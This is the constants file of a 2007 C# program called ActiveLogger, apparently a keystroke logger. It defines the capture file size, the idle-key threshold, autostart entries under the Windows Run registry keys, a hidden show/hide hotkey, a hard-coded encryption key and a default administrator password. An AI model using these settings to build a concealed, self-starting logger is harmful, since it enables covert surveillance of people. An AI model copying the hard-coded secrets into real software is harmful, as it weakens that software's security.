/*  * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*																		*
*	Copyright (C) 2007  Ahmet BUTUN (butun180@hotmail.com)				*
*	http://www.ahmetbutun.net									        *
*																		*
*	This program is free software; you can redistribute it and/or		*
*	modify it under the terms of the GNU General Public License as		*
*	published by the Free Software Foundation; either version 2 of		*
*	the License, or (at your option) any later version.					*
*																		*
*	This program is distributed in the hope that it will be useful,		*
*	but WITHOUT ANY WARRANTY; without even the implied warranty of		*
*	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU	*
*	General Public License for more details.							*
*																		*
*	You should have received a copy of the GNU General Public License	*
*	along with this program; if not, write to the Free Software			*
*	Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.			*
*																		*
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *  */

using System;
using System.Collections.Generic;
using System.Text;

namespace ActiveLogger
{
    class Constants
    {
        /// <summary>
        /// Security key(password) needed to encrypt/decrypt data
        /// </summary>
        public const string securityKey = "×Tp?eˆµ£6eÙ’ð“¯Œ«7Y¡,üCœ¶s‘ˆÇ¢J";

        /// <summary>
        /// Default value for maxErrorCount
        /// </summary>
        public const int defaultMaxErrorCount = 100;

        /// <summary>
        /// Default value for max of maxErrorCount
        /// </summary>
        public const int defaultMaxMaxErrorCount = 2000;

        /// <summary>
        /// Default value for maxCaptureFileSize
        /// </summary>
        public const long defaultCaptureFileSize = 8388608; // 8 MB

        /// <summary>
        /// Default value for max value of maxCaptureFileSize
        /// </summary>
        public const long defaultMaxCaptureFileSize = 2147483648; // 2048 MB

        /// <summary>
        /// Default value for unpressedTimeThreshHold
        /// </summary>
        public const int defaultUnpressedTimeThreshHold = 5; //Seconds

        /// <summary>
        /// Default value for max value of defaultUnpressedTimeThreshHold
        /// </summary>
        public const int defaultMaxUnpressedTimeThreshHold = 120; //Seconds
        
        /// <summary>
        /// Default value for administratorPassword
        /// </summary>
        public const string defaultAdministratorPassword = "derinweb";

        /// <summary>
        /// Default keyname of HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        /// </summary>
        public const string defaultHLMKey = "ActiveLogger";

        /// <summary>
        /// Default keyname of HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        /// </summary>
        public const string defaultHCUKey = "ActiveLogger";

        /// <summary>
        /// Default value for show/hide key
        /// </summary>
        public const KeyCodes.VirtualKey defaultShowHideKey = KeyCodes.VirtualKey.VK_Z;

        /// <summary>
        /// Default value for show/hide key modifier
        /// </summary>
        public const KeyCodes.Modifier defaultShowHideKeyModifier = KeyCodes.Modifier.MOD_ALT | KeyCodes.Modifier.MOD_CONTROL | KeyCodes.Modifier.MOD_SHIFT;

        /// <summary>
        /// Default value language
        /// </summary>
        public const Enums.Languages defaultCurrentLanguage = Enums.Languages.ENGLISH;

        /// <summary>
        /// Setting key of maxErrorCount
        /// </summary>
        public static string maxErrorCount = "maxErrorCount";

        /// <summary>
        /// Setting key of maxCaptureFileSize
        /// </summary>
        public static string maxCaptureFileSize = "maxCaptureFileSize";

        /// <summary>
        /// Setting key of unpressedTimeThreshHold
        /// </summary>
        public static string unpressedTimeThreshHold = "unpressedTimeThreshHold";

        /// <summary>
        /// Setting key of administratorPassword
        /// </summary>
        public static string administratorPassword = "administratorPassword";

        /// <summary>
        /// Setting key of show/hide key
        /// </summary>
        public static string showHideKey = "showHideKey";

        /// <summary>
        /// Setting key of show/hide key modifier
        /// </summary>
        public static string showHideKeyModifier = "showHideKeyModifier";

        /// <summary>
        /// Setting key of language
        /// </summary>
        public static string currentLanguage = "currentLanguage";
    }
}
